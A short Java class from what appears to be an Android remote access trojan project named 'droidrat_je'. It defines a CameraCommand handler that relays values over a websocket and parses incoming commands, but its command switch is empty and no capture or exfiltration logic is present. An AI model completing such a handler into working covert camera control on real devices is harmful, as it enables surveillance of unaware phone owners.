package com.je_chen.droidrat_je.command;

import android.content.Context;

import com.je_chen.droidrat_je.command.process_super.CommandFather;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class CameraCommand extends CommandFather{

    private Context context;

    public CameraCommand(Context context){
        this.context = context;
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
